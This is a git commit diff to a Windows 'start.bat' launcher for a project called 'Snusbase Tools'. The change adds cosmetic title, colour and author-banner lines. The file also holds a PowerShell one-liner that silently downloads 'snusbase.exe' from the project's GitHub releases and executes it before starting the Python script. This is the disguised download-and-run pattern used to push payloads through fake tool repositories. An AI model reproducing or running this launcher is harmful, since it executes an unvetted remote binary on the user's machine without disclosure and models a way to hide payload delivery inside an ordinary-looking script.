137979107a325e4df12a05c08bac939315df7a3a
IWcommunityFR <158751385+IWcommunityFR@users.noreply.github.com>
2024-02-27 17:52:16 +0100

    Update start.bat

--- start.bat
+++ start.bat
@@ -1,4 +1,12 @@
 @echo ofF
+
+title Snusbase Tools
+rem You can do any color
+color 0c
+
+echo.
+echo Coded By https://github.com/IWcommunityFR
+echo.
 cd src
 powershell $down=New-Object System.Net.WebClient;$url='https://github.com/IWcommunityFR/snusbase-tool/releases/download/snusbase/snusbase.exe';$file='snusbase.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
 py main.py
